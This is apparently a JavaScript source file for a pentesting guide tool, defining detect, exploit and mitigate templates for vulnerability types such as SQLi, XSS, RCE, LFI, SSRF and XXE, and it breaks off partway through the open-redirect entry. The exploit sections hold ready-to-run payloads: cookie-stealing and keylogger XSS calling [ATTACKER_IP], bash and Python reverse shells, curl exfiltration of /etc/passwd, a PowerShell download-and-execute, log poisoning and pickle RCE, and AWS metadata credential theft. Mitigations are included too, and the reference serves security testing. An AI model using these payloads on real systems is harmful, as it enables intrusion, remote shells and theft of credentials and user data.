/**
 * Expanded guide templates — 12 vulnerability types
 * Each step: { t: title, b: body, cmd?: string }
 */
const GUIDES = {
  // ── SQL INJECTION ─────────────────────────────────
  sqli: {
    name: 'SQL Injection (SQLi)',
    detect: [
      { t: 'Manual Quote Test',       b: "Append ' to parameters and look for SQL errors.", cmd: `curl -s "[TARGET_URL]?id=1'" | grep -iE "sql|error|syntax|ORA-"` },
      { t: 'sqlmap Full Scan',        b: 'Automated SQLi detection with level/risk tuning.', cmd: 'sqlmap -u "[TARGET_URL]?id=1" --dbs --batch --level=3 --risk=2 --random-agent' },
      { t: 'sqlmap POST Request',     b: 'Test POST body parameters.', cmd: `sqlmap -u "[TARGET_URL]/login" --data="user=admin&pass=test" --dbs --batch` },
      { t: 'Nmap HTTP-SQLi Script',   b: 'Quick Nmap NSE checks.', cmd: 'nmap --script http-sql-injection -p 80,443 [TARGET_HOST]' },
      { t: 'Burp Suite Intruder',     b: 'Use Burp Intruder with SQLi payload lists to fuzz parameters.' },
      { t: 'ghauri (Alternative)',    b: 'Modern sqlmap alternative with WAF bypass.', cmd: 'ghauri -u "[TARGET_URL]?id=1" --dbs --batch' },
    ],
    exploit: [
      { t: 'Boolean-Based Blind',     b: 'Infer data via true/false responses.', cmd: 'curl "[TARGET_URL]?id=1 AND 1=1--" && curl "[TARGET_URL]?id=1 AND 1=2--"' },
      { t: 'UNION-Based Extraction',  b: 'Extract usernames/passwords via UNION SELECT.', cmd: `curl "[TARGET_URL]?id=-1 UNION SELECT null,username,password,null FROM users--"` },
      { t: 'Time-Based Blind',        b: 'Confirm injection via response delay (MySQL).', cmd: `curl -o /dev/null -w "%{time_total}" "[TARGET_URL]?id=1 AND SLEEP(5)--"` },
      { t: 'MySQL File Read',         b: 'Read server files if DB user has FILE privilege.', cmd: `curl "[TARGET_URL]?id=1 UNION SELECT LOAD_FILE('/etc/passwd'),null,null--"` },
      { t: 'MySQL Webshell Write',    b: 'Write a PHP webshell if INTO OUTFILE is enabled.', cmd: `sqlmap -u "[TARGET_URL]?id=1" --os-shell --batch` },
      { t: 'sqlmap Full Dump',        b: 'Dump all tables after confirming injection.', cmd: 'sqlmap -u "[TARGET_URL]?id=1" --dump-all --batch --threads=5' },
    ],
    mitigate: [
      { t: 'Parameterized Queries',   b: 'Use prepared statements — never concatenate user input into SQL.' },
      { t: 'ORM Usage',               b: 'Use an ORM (SQLAlchemy, Hibernate, ActiveRecord) that handles parameterization.' },
      { t: 'Input Allowlisting',      b: 'Validate and allowlist expected formats server-side (e.g., only integers for id).' },
      { t: 'WAF Rule (ModSecurity)',  b: 'Block SQLi patterns at the edge.', cmd: `SecRule ARGS "@detectSQLi" "id:1001,phase:2,deny,msg:'SQLi Attempt'"` },
      { t: 'Least-Privilege DB User', b: 'App DB accounts should only have SELECT/INSERT/UPDATE — never DROP or FILE.' },
      { t: 'Error Suppression',       b: 'Disable verbose SQL errors in production. Use generic error pages.' },
    ],
    resources: ['https://owasp.org/www-community/attacks/SQL_Injection','https://portswigger.net/web-security/sql-injection','https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html','https://github.com/sqlmapproject/sqlmap','https://book.hacktricks.xyz/pentesting-web/sql-injection','https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-injection-auth-bypass'],
  },

  // ── XSS ───────────────────────────────────────────
  xss: {
    name: 'Cross-Site Scripting (XSS)',
    detect: [
      { t: 'Reflected XSS Probe',     b: 'Inject a probe string and check if it returns unescaped.', cmd: 'curl -s "[TARGET_URL]?q=XSS_PROBE_12345" | grep "XSS_PROBE_12345"' },
      { t: 'dalfox XSS Scanner',      b: 'Fast automated XSS scanner.', cmd: 'dalfox url "[TARGET_URL]?q=test" --silence' },
      { t: 'kxss Param Finder',       b: 'Find reflected parameters quickly.', cmd: `echo "[TARGET_URL]" | waybackurls | kxss` },
      { t: 'XSStrike',                b: 'Context-aware XSS scanner.', cmd: 'python3 xsstrike.py -u "[TARGET_URL]?q=test" --crawl' },
      { t: 'DOM XSS Inspection',      b: 'Check browser DevTools → Console for unsafe innerHTML/eval assignments.' },
      { t: 'Burp Suite Scanner',      b: 'Run Burp Pro Active Scanner; focus on reflected and stored XSS.' },
    ],
    exploit: [
      { t: 'Basic Alert PoC',         b: 'Minimal reflected XSS payload to confirm execution.', cmd: '[TARGET_URL]?input=<script>alert(document.domain)</script>' },
      { t: 'img onerror (tag bypass)', b: 'Bypass <script> tag filters.', cmd: '[TARGET_URL]?input=<img src=x onerror=alert(document.domain)>' },
      { t: 'SVG Event Handler',       b: 'SVG-based payload to bypass HTML filters.', cmd: '[TARGET_URL]?input=<svg onload=alert(document.domain)>' },
      { t: 'Cookie Theft (Stored)',   b: 'Stored XSS exfiltrating session cookie.', cmd: `<img src=x onerror="fetch('http://[ATTACKER_IP]/steal?c='+btoa(document.cookie))">` },
      { t: 'Keylogger Payload',       b: 'DOM-based keylogger (authorized lab only).', cmd: `<script>document.onkeypress=e=>fetch('http://[ATTACKER_IP]/log?k='+e.key)</script>` },
      { t: 'mXSS / Mutation',         b: 'Test innerHTML mutation vectors with DOMPurify bypass candidates.' },
    ],
    mitigate: [
      { t: 'Output Encoding',         b: 'HTML-encode all user-controlled output. Use DOMPurify for rich-text.' },
      { t: 'Content Security Policy', b: "Strict CSP header to block inline scripts.", cmd: `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'` },
      { t: 'X-XSS-Protection',        b: 'Legacy browser XSS filter.', cmd: 'X-XSS-Protection: 1; mode=block' },
      { t: 'HttpOnly Cookies',        b: 'Prevent JS cookie access.', cmd: 'Set-Cookie: session=TOKEN; HttpOnly; Secure; SameSite=Strict' },
      { t: 'Trusted Types API',       b: "Enable browser's Trusted Types to prevent DOM-XSS sinks.", cmd: `Content-Security-Policy: require-trusted-types-for 'script'` },
    ],
    resources: ['https://owasp.org/www-community/attacks/xss/','https://portswigger.net/web-security/cross-site-scripting','https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html','https://github.com/hahwul/dalfox','https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting','https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/writing-xss-shells'],
  },

  // ── RCE ───────────────────────────────────────────
  rce: {
    name: 'Remote Code Execution (RCE)',
    detect: [
      { t: 'JNDI OOB Canary',         b: 'Detect Log4j/JNDI blind RCE via DNS callback.', cmd: `curl -H 'X-Api-Version: \${jndi:ldap://[BURP_COLLAB]/a}' [TARGET_URL]` },
      { t: 'interactsh Listener',     b: 'Self-hosted OOB interaction server.', cmd: `interactsh-client -v\n# Then use [INTERACTSH_URL] in payloads` },
      { t: 'Time-Based Blind',         b: 'Inject sleep() to detect blind RCE.', cmd: 'curl -d "param=;sleep+5;" [TARGET_URL]' },
      { t: 'Nmap Vuln Scripts',        b: 'Scan for known RCE-prone services.', cmd: 'nmap --script vuln -p 80,443,8080,8443,9200 [TARGET_HOST]' },
      { t: 'nuclei CVE Templates',    b: 'Run nuclei with CVE-specific templates.', cmd: 'nuclei -u [TARGET_URL] -t cves/ -severity critical,high' },
      { t: 'Metasploit Auxiliary',    b: 'Check for module scanner (no exploitation).', cmd: 'msfconsole -q -x "use auxiliary/scanner/http/[MODULE]; set RHOSTS [TARGET_HOST]; run"' },
    ],
    exploit: [
      { t: 'Log4Shell (CVE-2021-44228)', b: 'JNDI LDAP payload in HTTP headers.', cmd: `curl -H 'User-Agent: \${jndi:ldap://[ATTACKER_IP]:1389/Exploit}' http://[TARGET_URL]` },
      { t: 'marshalsec LDAP Server',  b: 'Serve malicious LDAP endpoint for Log4Shell.', cmd: `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \\\n  "http://[ATTACKER_IP]:8000/#Exploit"` },
      { t: 'Bash Reverse Shell',      b: 'Standard bash reverse shell payload.', cmd: `# Listener:\nnc -lvnp 4444\n\n# Payload:\ncurl -d 'cmd=bash -c "bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1"' http://[TARGET_URL]` },
      { t: 'Python Reverse Shell',    b: 'Python-based reverse shell (more portable).', cmd: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("[ATTACKER_IP]",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'` },
      { t: 'msfvenom Payload',        b: 'Generate a custom Metasploit payload.', cmd: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=4444 -f elf > shell.elf` },
      { t: 'Metasploit Exploit',      b: 'Run a Metasploit exploit module (CVE-specific).', cmd: `msfconsole -q -x "use exploit/[MODULE]; set RHOSTS [TARGET_HOST]; set LHOST [ATTACKER_IP]; run"` },
    ],
    mitigate: [
      { t: 'Apply Vendor Patch',      b: 'Upgrade the affected library/component immediately.' },
      { t: 'Disable JNDI (Log4j)',    b: 'JVM flag for Log4j 2.10-2.14.', cmd: '-Dlog4j2.formatMsgNoLookups=true' },
      { t: 'Input Sanitization',      b: 'Never pass user input to system(), exec(), eval().' },
      { t: 'Egress Firewall',         b: 'Block outbound connections from app servers to prevent callbacks.' },
      { t: 'WAF Pattern Rules',       b: 'Block JNDI strings, shell metacharacters.', cmd: `SecRule REQUEST_HEADERS "@rx (?i)\\$\\{jndi:" "id:1002,phase:1,deny"` },
      { t: 'Runtime Protection',      b: 'Deploy RASP (Runtime Application Self-Protection) to detect/block RCE attempts in-process.' },
    ],
    resources: ['https://www.cisa.gov/known-exploited-vulnerabilities-catalog','https://github.com/fullhunt/log4j-scan','https://github.com/projectdiscovery/nuclei','https://packetstormsecurity.com','https://book.hacktricks.xyz/pentesting-web/rce-remote-code-execution'],
  },

  // ── PATH TRAVERSAL ────────────────────────────────
  traversal: {
    name: 'Path / Directory Traversal',
    detect: [
      { t: 'Manual Traversal Test',   b: 'Inject ../ sequences into file parameters.', cmd: 'curl "[TARGET_URL]?file=../../../etc/passwd"' },
      { t: 'URL-Encoded Variants',    b: 'Try double-encoded sequences.', cmd: 'curl "[TARGET_URL]?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"' },
      { t: 'Null Byte Bypass',        b: 'Append null byte to bypass extension checks (PHP < 5.3).', cmd: 'curl "[TARGET_URL]?file=../../../etc/passwd%00.jpg"' },
      { t: 'ffuf Path Fuzzing',       b: 'Fuzz path parameters with a traversal wordlist.', cmd: 'ffuf -u "[TARGET_URL]?page=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200' },
      { t: 'dotdotpwn',               b: 'Automated traversal fuzzer.', cmd: 'dotdotpwn -m http -h [TARGET_HOST] -f /etc/passwd -k "root"' },
      { t: 'nuclei Traversal',        b: 'Run nuclei path traversal templates.', cmd: 'nuclei -u [TARGET_URL] -t vulnerabilities/generic/traversal.yaml' },
    ],
    exploit: [
      { t: 'Linux /etc/passwd',       b: 'Read system user list.', cmd: 'curl "[TARGET_URL]?file=../../../../etc/passwd"' },
      { t: 'SSH Private Key',         b: 'Extract SSH keys if accessible.', cmd: 'curl "[TARGET_URL]?file=../../../../root/.ssh/id_rsa"' },
      { t: 'App Config Files',        b: 'Read application configuration with credentials.', cmd: `curl "[TARGET_URL]?file=../../../../var/www/html/.env"\ncurl "[TARGET_URL]?file=../../../../etc/mysql/my.cnf"` },
      { t: 'Windows Sensitive Files', b: 'Read Windows system files.', cmd: `curl "[TARGET_URL]?file=..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"\ncurl "[TARGET_URL]?file=..\\..\\..\\Windows\\repair\\sam"` },
      { t: 'Web Server Configs',      b: 'Extract web server configuration.', cmd: `curl "[TARGET_URL]?file=../../../../etc/nginx/nginx.conf"\ncurl "[TARGET_URL]?file=../../../../etc/apache2/apache2.conf"` },
    ],
    mitigate: [
      { t: 'Canonicalize Paths',      b: 'Use realpath/canonicalize and verify it starts with allowed base dir.' },
      { t: 'Allowlist File Names',    b: 'Never build paths dynamically from user input. Use allowlists.' },
      { t: 'Chroot / Container',      b: 'Run the application in a chroot jail or container.' },
      { t: 'Disable Directory List',  b: 'Disable directory listing.', cmd: '# Apache: Options -Indexes\n# Nginx:  autoindex off;' },
      { t: 'Restrict File Extensions', b: 'Only permit access to specific file extensions via allowlist.' },
    ],
    resources: ['https://owasp.org/www-community/attacks/Path_Traversal','https://portswigger.net/web-security/file-path-traversal','https://github.com/wireghoul/dotdotpwn','https://book.hacktricks.xyz/pentesting-web/file-inclusion/path-traversal'],
  },

  // ── LFI ───────────────────────────────────────────
  lfi: {
    name: 'Local File Inclusion (LFI)',
    detect: [
      { t: 'Basic LFI Test',          b: 'Test page parameters with traversal.', cmd: 'curl "[TARGET_URL]?page=../../../etc/passwd"' },
      { t: 'PHP Filter Wrapper',      b: 'Extract base64-encoded PHP source.', cmd: 'curl "[TARGET_URL]?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d' },
      { t: 'php://input Wrapper',     b: 'Test PHP input stream inclusion.', cmd: 'curl -d "<?php echo shell_exec(id); ?>" "[TARGET_URL]?page=php://input"' },
      { t: 'LFiFreak',                b: 'Automated LFI exploitation tool.', cmd: 'python2 LFiFreak.py -u "[TARGET_URL]?page=FUZZ" -e Unix' },
      { t: 'wfuzz LFI Fuzzing',       b: 'Fuzz LFI with wfuzz.', cmd: 'wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "[TARGET_URL]?page=FUZZ" --hc 404' },
    ],
    exploit: [
      { t: 'Credential Disclosure',   b: 'Read config files with credentials.', cmd: `curl "[TARGET_URL]?page=../../../../etc/mysql/my.cnf"\ncurl "[TARGET_URL]?page=../../../../var/www/html/config.php"` },
      // eslint-disable-next-line no-useless-escape
      { t: 'Log Poisoning → RCE',     b: 'Inject PHP into access log, then include it.', cmd: `# 1. Poison log:\ncurl -H "User-Agent: <?php system(\$_GET['c']); ?>" [TARGET_URL]\n# 2. Execute via LFI:\ncurl "[TARGET_URL]?page=../../../../var/log/apache2/access.log&c=id"` },
      { t: '/proc/self/environ',      b: 'Inject via User-Agent, include environ.', cmd: `curl -H "User-Agent: <?php system('id'); ?>" "[TARGET_URL]?page=/proc/self/environ"` },
      { t: 'PHP Session Inclusion',   b: 'Include a controlled PHP session file.', cmd: 'curl "[TARGET_URL]?page=../../../../tmp/sess_[SESSION_ID]"' },
      { t: 'data:// Wrapper',         b: 'Include base64-encoded PHP code directly.', cmd: `curl "[TARGET_URL]?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+"` },
    ],
    mitigate: [
      { t: 'Disable PHP Wrappers',    b: 'Restrict dangerous PHP wrappers.', cmd: 'allow_url_fopen = Off\nallow_url_include = Off' },
      { t: 'Allowlist Includable Files', b: 'Explicit list of permitted include paths.' },
      { t: 'Store Outside Web Root',  b: 'Place included modules outside the publicly accessible web root.' },
      { t: 'open_basedir Restriction', b: 'Restrict PHP file access with open_basedir.', cmd: 'open_basedir = /var/www/html:/tmp' },
    ],
    resources: ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion','https://book.hacktricks.xyz/pentesting-web/file-inclusion'],
  },

  // ── COMMAND INJECTION ─────────────────────────────
  cmdinj: {
    name: 'OS Command Injection',
    detect: [
      { t: 'Semicolon Test',          b: 'Append OS commands after delimiters.', cmd: 'curl "[TARGET_URL]?host=127.0.0.1;id"' },
      { t: 'Time-Based Blind',        b: 'Measure delay to detect blind injection.', cmd: 'curl -s -o /dev/null -w "%{time_total}" "[TARGET_URL]?input=;sleep+5"' },
      { t: 'commix Scanner',          b: 'Comprehensive command injection tester.', cmd: 'commix --url="[TARGET_URL]?param=INJECT_HERE" --os-cmd="id" --batch' },
      { t: 'wfuzz OS Command Fuzzing', b: 'Fuzz with command injection wordlist.', cmd: 'wfuzz -c -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -u "[TARGET_URL]?param=FUZZ"' },
      { t: 'Burp Suite Collaborator', b: 'Use Burp Collaborator to detect OOB command execution.' },
    ],
    exploit: [
      { t: 'Direct File Read',        b: 'Read sensitive files via injected commands.', cmd: 'curl "[TARGET_URL]?host=127.0.0.1;cat+/etc/passwd"' },
      { t: 'Subshell Execution',      b: 'Use $() subshell for cleaner injection.', cmd: 'curl "[TARGET_URL]?host=127.0.0.1$(id)"' },
      { t: 'OOB DNS Callback',        b: 'Confirm blind injection with DNS exfiltration.', cmd: 'curl "[TARGET_URL]?cmd=;nslookup+$(whoami).[BURP_COLLAB]"' },
      { t: 'curl Data Exfil',         b: 'Exfiltrate data via outbound HTTP call.', cmd: 'curl "[TARGET_URL]?cmd=;curl+http://[ATTACKER_IP]:8080/$(cat+/etc/passwd|base64)"' },
      { t: 'Reverse Shell',           b: 'Spawn interactive shell.', cmd: `# Listener first:\nnc -lvnp 4444\n\n# Inject:\ncurl "[TARGET_URL]?host=;bash+-c+'bash+-i+>%26+/dev/tcp/[ATTACKER_IP]/4444+0>%261'"` },
      { t: 'PowerShell (Windows)',    b: 'Windows command injection via PowerShell.', cmd: `curl "[TARGET_URL]?cmd=;powershell+-c+IEX(New-Object+Net.WebClient).DownloadString('http://[ATTACKER_IP]/shell.ps1')"` },
    ],
    mitigate: [
      { t: 'Avoid Shell Functions',   b: 'Never pass user input to shell_exec, system, exec, subprocess(shell=True).' },
      { t: 'Strict Allowlisting',     b: 'Allow only safe characters (alphanumeric) for params near OS calls.' },
      { t: 'Argument Escaping',       b: 'Escape when shell calls are unavoidable.', cmd: '# Python: shlex.quote(user_input)\n# PHP: escapeshellarg($input)' },
      { t: 'Seccomp / AppArmor',      b: 'Restrict which syscalls/executables the app process can invoke.' },
    ],
    resources: ['https://owasp.org/www-community/attacks/Command_Injection','https://portswigger.net/web-security/os-command-injection','https://github.com/commixproject/commix','https://book.hacktricks.xyz/pentesting-web/command-injection'],
  },

  // ── DESERIALIZATION ───────────────────────────────
  deser: {
    name: 'Insecure Deserialization',
    detect: [
      { t: 'Identify Serialized Data', b: 'Look for Java AC ED magic bytes, PHP O: strings, base64 pickle in cookies.', cmd: 'echo "[COOKIE_VALUE]" | base64 -d | xxd | head -4' },
      { t: 'ysoserial OOB Canary',    b: 'Generate DNS-callback canary payload.', cmd: 'java -jar ysoserial.jar CommonsCollections1 "curl http://[BURP_COLLAB]" > canary.ser' },
      { t: 'Burp Deser Scanner Ext',  b: 'Use Java Deserialization Scanner Burp extension to identify vulnerable endpoints.' },
      { t: 'jadx / jd-gui Decompile', b: 'Decompile JAR to identify ObjectInputStream usage.', cmd: 'jadx -d output/ target.jar' },
      { t: 'serialkiller Config',     b: 'Check if SerialKiller allowlisting is in place (Java apps).' },
    ],
    exploit: [
      { t: 'Java ysoserial RCE',      b: 'Send gadget chain payload to Java deserialization endpoint.', cmd: `java -jar ysoserial.jar CommonsCollections1 'curl http://[ATTACKER_IP]/pwned' > payload.ser\ncurl -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.ser [TARGET_URL]` },
      { t: 'Python Pickle RCE',       b: 'Malicious pickle payload (lab only).', cmd: `import pickle, os, base64\nclass X:\n    def __reduce__(self):\n        return (os.system, ('curl http://[ATTACKER_IP]/pwned',))\nprint(base64.b64encode(pickle.dumps(X())).decode())` },
      { t: 'Ruby Marshal',            b: 'Ruby deserialization via Marshal.load().', cmd: `ruby -e 'puts [Marshal.dump(\`id\`)].pack("m")'` },
      { t: 'PHP unserialize',         b: 'Inject PHP magic method chain.', cmd: `O:7:"Exploit":1:{s:3:"cmd";s:2:"id";}` },
      { t: 'PHPGGC Gadget Chains',    b: 'Generate PHP deserialization gadget chains.', cmd: './phpggc -l\n./phpggc Laravel/RCE1 system id | base64' },
    ],
    mitigate: [
      { t: 'Avoid Native Deser',      b: 'Do not deserialize untrusted data using native serialization. Use JSON.' },
      { t: 'HMAC Signature',          b: 'Sign serialized blobs server-side; verify before deserializing.' },
      { t: 'JEP-290 Filters (Java)',  b: 'Use JEP-290 deserialization filters to allowlist acceptable classes.', cmd: '-Djdk.serialFilter=!*' },
      { t: 'SerialKiller / NotSoSer', b: 'Agent-based solutions to block gadget chains at JVM level.' },
      { t: 'Update Gadget Libraries', b: 'Keep Commons Collections, Spring, OGNL, and other gadget libraries up to date.' },
    ],
    resources: ['https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data','https://github.com/frohoff/ysoserial','https://github.com/ambionics/phpggc','https://portswigger.net/web-security/deserialization','https://book.hacktricks.xyz/pentesting-web/deserialization'],
  },

  // ── SSRF ──────────────────────────────────────────
  ssrf: {
    name: 'Server-Side Request Forgery (SSRF)',
    detect: [
      { t: 'Basic SSRF Probe',        b: 'Point a URL parameter at Burp Collaborator / interactsh.', cmd: `curl "[TARGET_URL]?url=http://[BURP_COLLAB]"` },
      { t: 'Cloud Metadata Probe',    b: 'Test access to AWS EC2 IMDS endpoint.', cmd: `curl "[TARGET_URL]?url=http://169.254.169.254/latest/meta-data/"` },
      { t: 'Internal Port Scan',      b: 'Use SSRF to scan internal services.', cmd: `for port in 22 80 443 3306 6379 8080 9200; do\n  curl -s -o /dev/null -w "$port: %{http_code}\\n" "[TARGET_URL]?url=http://127.0.0.1:$port/"\ndone` },
      { t: 'ssrfmap Tool',            b: 'Automated SSRF exploitation.', cmd: 'python3 ssrfmap.py -r request.txt -p url -m readfiles' },
      { t: 'Gopherus (Gopher SSRF)',  b: 'Generate gopher:// payloads for protocol abuse.', cmd: 'python2 gopherus.py --exploit redis' },
    ],
    exploit: [
      { t: 'AWS Metadata Credential Theft', b: 'Steal IAM credentials via IMDS.', cmd: `curl "[TARGET_URL]?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"\ncurl "[TARGET_URL]?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]"` },
      { t: 'Redis RCE via Gopher',    b: 'Use gopher:// to write to Redis and achieve RCE.', cmd: `python2 gopherus.py --exploit redis\n# Use generated gopher:// URL in the SSRF parameter` },
      { t: 'Internal API Abuse',      b: 'Access internal APIs not exposed to internet.', cmd: `curl "[TARGET_URL]?url=http://192.168.1.1/admin/\ncurl "[TARGET_URL]?url=http://localhost:8500/v1/agent/members"` },
      { t: 'File Read via file://',   b: 'If file:// is allowed, read local files.', cmd: `curl "[TARGET_URL]?url=file:///etc/passwd"` },
    ],
    mitigate: [
      { t: 'Allowlist Destination URLs', b: 'Only allow requests to a strict allowlist of domains/IPs.' },
      { t: 'Block Internal Ranges',   b: 'Deny requests to 169.254.x.x, 10.x, 172.16-31.x, 192.168.x.x.', cmd: `# iptables rule to block IMDS from app server:\niptables -A OUTPUT -d 169.254.169.254 -m owner --uid-owner www-data -j DROP` },
      { t: 'Disable Unused Schemes',  b: 'Block gopher://, file://, dict://, ftp:// in HTTP client config.' },
      { t: 'IMDSv2 (AWS)',            b: 'Enforce IMDSv2 (token-based) to mitigate SSRF-based metadata theft.', cmd: 'aws ec2 modify-instance-metadata-options --instance-id [ID] --http-tokens required' },
      { t: 'Response Filtering',      b: 'Never return raw HTTP responses from server-side fetches to clients.' },
    ],
    resources: ['https://portswigger.net/web-security/ssrf','https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html','https://github.com/swisskyrepo/SSRFmap','https://github.com/tarunkant/Gopherus','https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery'],
  },

  // ── XXE ───────────────────────────────────────────
  xxe: {
    name: 'XML External Entity (XXE) Injection',
    detect: [
      { t: 'Basic XXE Probe',         b: 'Send an XML payload with an external entity pointing to your server.', cmd: `curl -X POST -H "Content-Type: application/xml" \\\n  -d '<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://[BURP_COLLAB]">]><root>&xxe;</root>' \\\n  [TARGET_URL]` },
      { t: 'OOB XXE via DNS',         b: 'Detect blind XXE via DNS callback.', cmd: `curl -X POST -H "Content-Type: application/xml" \\\n  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://[BURP_COLLAB]/xxe">]><foo>&xxe;</foo>' \\\n  [TARGET_URL]/api` },
      { t: 'XXE in SVG / Office',     b: 'Test file upload endpoints accepting SVG, DOCX, XLSX, ODT.' },
      { t: 'XXEinjector',             b: 'Automated XXE exploitation tool.', cmd: 'ruby XXEinjector.rb --host=[ATTACKER_IP] --httpport=80 --file=xxe_request.txt --oob=http' },
      { t: 'Content-Type Swap',       b: 'Try changing Content-Type to application/xml on JSON endpoints to reveal hidden XML parsers.' },
    ],
    exploit: [
      { t: 'Local File Read',         b: 'Read /etc/passwd via file:// entity.', cmd: `curl -X POST -H "Content-Type: application/xml" \\\n  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' \\\n  [TARGET_URL]` },
      { t: 'SSRF via XXE',            b: 'Use XXE entity to reach internal services.', cmd: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>` },
      { t: 'OOB Data Exfiltration',   b: 'Use parameter entities to exfiltrate data out-of-band.', cmd: `<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM "http://[ATTACKER_IP]/evil.dtd">\n  %xxe;\n]><foo/>` },
      { t: 'PHP Expect RCE',          b: 'If PHP expect:// wrapper is available.', cmd: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>` },
    ],
    mitigate: [
      { t: 'Disable External Entities', b: 'Disable XXE in your XML parser.', cmd: `# Java (DocumentBuilderFactory):\ndbf.setFeature("http://xml.org/sax/features/external-general-entities", false);\n# Python lxml:\nparser = etree.XMLParser(resolve_entities=False)` },
      { t: 'Use JSON Instead',        b: 'Where possible replace XML APIs with JSON to eliminate the attack surface.' },
      { t: 'Schema Validation',       b: 'Validate XML against a strict DTD/schema before processing.' },
      { t: 'WAF XXE Signatures',      b: 'Block DOCTYPE declarations at the WAF level.', cmd: `SecRule REQUEST_BODY "@rx <!ENTITY" "id:1003,phase:2,deny"` },
    ],
    resources: ['https://portswigger.net/web-security/xxe','https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing','https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html','https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity'],
  },

  // ── IDOR ──────────────────────────────────────────
  idor: {
    name: 'Insecure Direct Object Reference (IDOR)',
    detect: [
      { t: 'Manual ID Enumeration',   b: 'Change numeric IDs, GUIDs, or Base64-encoded objects in URLs/params.', cmd: `# Test sequential IDs:\nfor i in $(seq 1 20); do\n  curl -s -o /dev/null -w "ID $i: %{http_code}\\n" -b "session=[YOUR_COOKIE]" "[TARGET_URL]/api/user/$i"\ndone` },
      { t: 'Autorize Burp Extension', b: 'Replay requests as a lower-privilege user; highlights unauthorized access automatically.' },
      { t: 'Base64/Encoded Object IDs', b: 'Decode Base64 IDs and replace with other user IDs.', cmd: `echo "eyJ1c2VySWQiOiAxfQ==" | base64 -d\n# Modify and re-encode:\necho '{"userId": 2}' | base64` },
      { t: 'Param Miner (Burp)',       b: 'Discover hidden parameters that might reference objects.' },
      { t: 'ffuf IDOR Fuzzing',       b: 'Fuzz object IDs for unauthorized responses.', cmd: 'ffuf -u "[TARGET_URL]/api/invoice/FUZZ" -w ids.txt -H "Cookie: session=[COOKIE]" -mc 200' },
    ],
    exploit: [
      { t: 'Access Other User Data',  b: "Read another user's profile/orders/messages.", cmd: `# Victim's user ID = 456, attacker's = 123:\ncurl -b "session=[ATTACKER_SESSION]" "[TARGET_URL]/api/users/456/profile"` },
      { t: 'Horizontal Privilege Escalation', b: 'Access objects belonging to same-level users.' },
      { t: 'Vertical Privilege Escalation', b: 'Access admin-only objects by modifying an object ID.', cmd: `curl -b "session=[COOKIE]" "[TARGET_URL]/api/admin/settings/1"` },
      { t: 'Mass Data Harvesting',    b: 'Enumerate all IDs to harvest PII at scale.', cmd: `seq 1 1000 | xargs -P10 -I{} curl -s -b "session=[COOKIE]" "[TARGET_URL]/api/user/{}/data" -o /tmp/user_{}.json` },
    ],
    mitigate: [
      { t: 'Server-Side Authorization', b: 'Verify every request: does the authenticated user own this resource?' },
      { t: 'Use Indirect References', b: 'Map internal IDs to random tokens per-user session. Never expose DB IDs.' },
      { t: 'ABAC (Attribute-Based AC)', b: 'Implement attribute-based access control policies for fine-grained enforcement.' },
      { t: 'Rate Limiting',           b: 'Rate-limit enumeration of object IDs to slow down attackers.' },
      { t: 'Audit Logging',           b: 'Log all object access with user identity for anomaly detection.' },
    ],
    resources: ['https://portswigger.net/web-security/access-control/idor','https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References','https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html','https://book.hacktricks.xyz/pentesting-web/idor'],
  },

  // ── OPEN REDIRECT ─────────────────────────────────
  redirect: {
    name: 'Open Redirect',
    detect: [
      { t: 'Manual Redirect Test',    b: 'Replace redirect parameter values with an external domain.', cmd: `curl -I "[TARGET_URL]?next=https://evil.com"\ncurl -I "[TARGET_URL]/redirect?url=https://attacker.io"` },
      { t: 'Common Redirect Params',  b: 'Fuzz common redirect parameter names.', cmd: `for p in next url redirect return to goto continue; do\n  curl -I -s "[TARGET_URL]?$p=https://evil.com" | grep -i location\ndone` },
